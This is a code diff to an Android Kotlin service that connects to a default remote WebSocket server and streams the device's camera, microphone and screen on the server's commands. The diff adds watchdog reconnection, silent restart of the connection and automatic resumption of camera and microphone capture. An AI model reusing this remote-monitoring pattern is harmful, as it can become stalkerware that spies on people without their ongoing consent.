@@ -4,6 +4,10 @@ import android.Manifest
 import android.app.*
 import android.app.Activity
 import android.content.Intent
+import android.content.Context
+import android.net.ConnectivityManager
+import android.net.Network
+import android.net.NetworkCapabilities
 import android.content.pm.PackageManager
 import android.content.pm.ServiceInfo
 import android.graphics.*
@@ -44,12 +48,29 @@ class ConnectionService : Service() {
         private const val NOTIFICATION_ID = 1001
         private const val CAMERA_FRAME_INTERVAL_MS = 333L
         private const val SCREEN_FRAME_INTERVAL_MS = 250L
+        private const val PREFS = "darkcore_prefs"
+        private const val PREF_AUTO_RESUME_MEDIA = "auto_resume_media"
+        private const val PREF_CONNECTION_ENABLED = "connection_enabled"
+        private const val RECONNECT_WATCHDOG_MS = 60_000L
+        private const val DEFAULT_HOST = "wss://remote-test.shoujansapkota.com.np/ws"
     }
 
     private var socket: WebSocket? = null
     private var host = ""
     private var retrySeconds = 2L
     private var reconnecting = false
+    private var desiredCamera = false
+    private var desiredMicrophone = false
+    private var networkCallbackRegistered = false
+    private val reconnectHandler = Handler(Looper.getMainLooper())
+    private val reconnectWatchdog = object : Runnable {
+        override fun run() {
+            if (host.isNotBlank() && connectionEnabled() && socket == null) {
+                scheduleReconnect(immediate = true)
+            }
+            reconnectHandler.postDelayed(this, RECONNECT_WATCHDOG_MS)
+        }
+    }
 
     // Camera
     private var cameraDevice: CameraDevice? = null
@@ -76,6 +97,19 @@ class ConnectionService : Service() {
     private var screenRunning = false
     private var lastScreenFrameAt = 0L
 
+    private val connectivityManager by lazy {
+        getSystemService(ConnectivityManager::class.java)
+    }
+
+    private val networkCallback = object : ConnectivityManager.NetworkCallback() {
+        override fun onAvailable(network: Network) {
+            if (host.isNotBlank() && socket == null) {
+                retrySeconds = 2L
+                scheduleReconnect(immediate = true)
+            }
+        }
+    }
+
     private val client = OkHttpClient.Builder()
         .connectTimeout(10, TimeUnit.SECONDS)
         .readTimeout(0, TimeUnit.MILLISECONDS)
@@ -85,17 +119,37 @@ class ConnectionService : Service() {
     override fun onCreate() {
         super.onCreate()
         createNotificationChannel()
+        host = getSharedPreferences(PREFS, MODE_PRIVATE)
+            .getString("host", DEFAULT_HOST)
+            .orEmpty()
+        desiredCamera = getSharedPreferences(PREFS, MODE_PRIVATE)
+            .getBoolean("desired_camera", false)
+        desiredMicrophone = getSharedPreferences(PREFS, MODE_PRIVATE)
+            .getBoolean("desired_microphone", false)
+        registerNetworkCallback()
+        reconnectHandler.post(reconnectWatchdog)
+
+        // If Android recreates the foreground service after the process was reclaimed,
+        // restore the previously enabled connection without requiring the Activity to open.
+        if (connectionEnabled() && host.isNotBlank()) {
+            startForegroundForCurrentState()
+            connect()
+        }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         when (intent?.action) {
             ACTION_CONNECT -> {
-                host = intent.getStringExtra(EXTRA_HOST).orEmpty()
+                host = intent.getStringExtra(EXTRA_HOST).orEmpty().ifBlank { host.ifBlank { DEFAULT_HOST } }
+                saveHost()
+                setConnectionEnabled(true)
                 startForegroundForCurrentState()
                 connect()
             }
             ACTION_START_SCREEN -> {
-                host = intent.getStringExtra(EXTRA_HOST).orEmpty().ifBlank { host }
+                host = intent.getStringExtra(EXTRA_HOST).orEmpty().ifBlank { host.ifBlank { DEFAULT_HOST } }
+                saveHost()
+                setConnectionEnabled(true)
                 startForegroundForScreen()
                 connect()
                 val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, ActivityResultCodes.CANCELLED)
@@ -108,6 +162,7 @@ class ConnectionService : Service() {
             }
             ACTION_STOP_SCREEN -> stopScreenProjection()
             ACTION_DISCONNECT -> {
+                setConnectionEnabled(false)
                 reconnecting = false
                 stopCamera()
                 stopMicrophone()
@@ -176,6 +231,10 @@ class ConnectionService : Service() {
                     reconnecting = false
                     updateNotification(currentNotificationText())
                     broadcast("CONNECTED")
+                    if (autoResumeMedia()) {
+                        if (desiredCamera && hasPermission(Manifest.permission.CAMERA)) startCamera()
+                        if (desiredMicrophone && hasPermission(Manifest.permission.RECORD_AUDIO)) startMicrophone()
+                    }
                     sendStatus(webSocket)
                 }
 
@@ -186,18 +245,22 @@ class ConnectionService : Service() {
                             "ping" -> webSocket.send(JSONObject().put("type", "pong").toString())
                             "request_camera" -> {
                                 requestedCameraFacing = if (msg.optString("facing", "back").equals("front", true)) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
+                                desiredCamera = true
+                                saveMediaIntent()
                                 if (hasPermission(Manifest.permission.CAMERA)) startCamera() else sendError("Camera permission is not granted")
                             }
-                            "stop_camera" -> stopCamera()
+                            "stop_camera" -> { desiredCamera = false; saveMediaIntent(); stopCamera() }
                             "request_microphone" -> {
                                 requestedMicSource = when (msg.optString("source", "mic").lowercase()) {
                                     "camcorder" -> MediaRecorder.AudioSource.CAMCORDER
                                     "voice_communication" -> MediaRecorder.AudioSource.VOICE_COMMUNICATION
                                     else -> MediaRecorder.AudioSource.MIC
                                 }
+                                desiredMicrophone = true
+                                saveMediaIntent()
                                 if (hasPermission(Manifest.permission.RECORD_AUDIO)) startMicrophone() else sendError("Microphone permission is not granted")
                             }
-                            "stop_microphone" -> stopMicrophone()
+                            "stop_microphone" -> { desiredMicrophone = false; saveMediaIntent(); stopMicrophone() }
                             "request_screen" -> {
                                 // A running projection can be used immediately. A new projection requires
                                 // Android's visible system consent dialog, which is requested by the Activity.
@@ -220,6 +283,7 @@ class ConnectionService : Service() {
                     socket = null
                     stopCamera()
                     stopMicrophone()
+                    // desiredCamera/desiredMicrophone remain true so they can resume after reconnect.
                     // Keep an active screen projection alive; it can reconnect later.
                     broadcast("Disconnected")
                     scheduleReconnect()
@@ -260,15 +324,57 @@ class ConnectionService : Service() {
         broadcast("ERROR: $message")
     }
 
-    private fun scheduleReconnect() {
+    private fun scheduleReconnect(immediate: Boolean = false) {
         if (reconnecting || host.isBlank()) return
         reconnecting = true
-        Thread {
-            try { Thread.sleep(retrySeconds * 1000) } catch (_: InterruptedException) { return@Thread }
+        val delayMs = if (immediate) 250L else retrySeconds * 1000L
+        Handler(Looper.getMainLooper()).postDelayed({
             reconnecting = false
-            retrySeconds = min(retrySeconds * 2, 60)
-            connect()
-        }.start()
+            if (socket == null && host.isNotBlank()) {
+                retrySeconds = min(retrySeconds * 2, 60)
+                connect()
+            }
+        }, delayMs)
+    }
+
+    private fun connectionEnabled(): Boolean =
+        getSharedPreferences(PREFS, MODE_PRIVATE).getBoolean(PREF_CONNECTION_ENABLED, false)
+
+    private fun setConnectionEnabled(enabled: Boolean) {
+        getSharedPreferences(PREFS, MODE_PRIVATE).edit()
+            .putBoolean(PREF_CONNECTION_ENABLED, enabled)
+            .apply()
+    }
+
+    private fun autoResumeMedia(): Boolean =
+        getSharedPreferences(PREFS, MODE_PRIVATE).getBoolean(PREF_AUTO_RESUME_MEDIA, true)
+
+    private fun saveHost() {
+        getSharedPreferences(PREFS, MODE_PRIVATE).edit().putString("host", host).apply()
+    }
+
+    private fun saveMediaIntent() {
+        getSharedPreferences(PREFS, MODE_PRIVATE).edit()
+            .putBoolean("desired_camera", desiredCamera)
+            .putBoolean("desired_microphone", desiredMicrophone)
+            .apply()
+    }
+
+    private fun registerNetworkCallback() {
+        if (networkCallbackRegistered) return
+        runCatching {
+            val request = android.net.NetworkRequest.Builder()
+                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+                .build()
+            connectivityManager.registerNetworkCallback(request, networkCallback)
+            networkCallbackRegistered = true
+        }
+    }
+
+    private fun unregisterNetworkCallback() {
+        if (!networkCallbackRegistered) return
+        runCatching { connectivityManager.unregisterNetworkCallback(networkCallback) }
+        networkCallbackRegistered = false
     }
 
     private fun startCamera() {
@@ -320,10 +426,17 @@ class ConnectionService : Service() {
                             override fun onConfigured(session: CameraCaptureSession) {
                                 cameraSession = session
                                 try {
-                                    val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
-                                        addTarget(surface)
-                                        set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
-                                    }.build()
+                                    val builder = try {
+                                        camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
+                                    } catch (e: CameraAccessException) {
+                                        // Some camera implementations report TEMPLATE_PREVIEW as unsupported.
+                                        camera.createCaptureRequest(CameraDevice.TEMPLATE_RECORD)
+                                    }
+                                    builder.addTarget(surface)
+                                    runCatching {
+                                        builder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
+                                    }
+                                    val request = builder.build()
                                     session.setRepeatingRequest(request, null, cameraHandler)
                                     cameraRunning = true
                                     lastCameraFrameAt = 0L
@@ -607,12 +720,14 @@ class ConnectionService : Service() {
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onDestroy() {
+        reconnectHandler.removeCallbacks(reconnectWatchdog)
         reconnecting = false
         stopCamera()
         stopMicrophone()
         stopScreenProjection()
         socket?.close(1000, "Service stopped")
         socket = null
+        unregisterNetworkCallback()
         super.onDestroy()
     }
 
